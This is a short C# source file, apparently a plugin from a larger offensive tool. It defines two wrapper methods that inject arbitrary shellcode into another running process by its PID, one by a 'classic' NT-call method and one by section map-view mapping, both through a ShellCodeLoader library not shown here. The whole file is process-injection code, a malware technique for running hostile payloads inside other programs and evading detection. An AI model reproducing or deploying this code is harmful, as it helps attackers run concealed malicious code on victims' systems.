using System.Diagnostics;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    internal static class ProcessInjection
    {
		internal static void InjectShellCodeClassicMethod(int PID, byte[] shellcode)
		{
			ShellCodeLoader.ShellCodeLoaderEx shellCodeLoaderEx = new ShellCodeLoader.ShellCodeLoaderEx(Process.GetProcessById(PID), shellcode);
			shellCodeLoaderEx.LoadWithNT();
		}

		internal static void InjectShellCodeMapView(int PID, byte[] shellcode)
		{
			ShellCodeLoader.MapView mapView = new ShellCodeLoader.MapView(Process.GetProcessById(PID), shellcode);
			mapView.LoadWithNtMapView();
		}
	}
}
